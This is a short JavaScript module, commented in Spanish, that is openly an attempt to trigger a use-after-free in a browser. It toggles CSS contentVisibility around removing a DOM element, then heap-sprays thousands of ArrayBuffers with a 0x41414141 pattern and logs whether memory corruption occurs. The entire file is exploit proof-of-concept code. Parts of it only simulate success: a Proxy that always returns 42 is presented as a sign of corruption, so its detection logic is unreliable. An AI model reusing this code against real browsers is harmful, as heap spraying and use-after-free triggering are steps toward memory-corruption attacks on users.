import { debug_log } from './module/utils.mjs';

const container = document.querySelector(".container");
let child = document.querySelector(".child");

function heapSpray() {
  const spray = [];
  const pattern = 0x41414141; // patrón "AAAA"

  // Creamos un Proxy para detectar accesos (simula corrupción)
  const proxyObj = new Proxy({}, {
    get(target, prop) {
      debug_log(`Proxy object property "${prop.toString()}" accessed — possible corruption!`);
      return 42;
    }
  });

  for (let i = 0; i < 3000; i++) {
    let buffer = new ArrayBuffer(0x1000);
    let view = new Uint32Array(buffer);
    view.fill(pattern);
    spray.push(view);
  }

  spray.push(proxyObj);

  debug_log("Heap spray with pattern and proxy object completed.");
  return spray;
}

export function triggerUAF() {
  if (!container || !child) {
    debug_log("Missing container or child element.");
    return;
  }

  try {
    container.style.contentVisibility = "hidden";
    child.remove();

    setTimeout(() => {
      container.style.contentVisibility = "auto";
      const spray = heapSpray();

      if (!document.querySelector(".child")) {
        debug_log("✅ .child element removed from DOM (memory possibly freed).");
      } else {
        debug_log("❌ .child element still in DOM.");
      }

      // Intentar acceder a la propiedad del proxy (simulando uso de memoria corrupta)
      try {
        let val = spray[spray.length - 1].someProperty;
        debug_log(`Proxy object property access returned: ${val}`);
      } catch (e) {
        debug_log("Error accessing proxy object property: " + e.message);
      }

      if (spray.length > 0 && spray[0][0] === pattern) {
        debug_log("Heap spray pattern detected in first buffer.");
      } else {
        debug_log("Heap spray pattern NOT detected in first buffer.");
      }

      debug_log("UAF triggered. Check for crash or memory corruption.");

    }, 0);

  } catch (e) {
    debug_log("Exception caught during triggerUAF: " + e.message);
  }
}
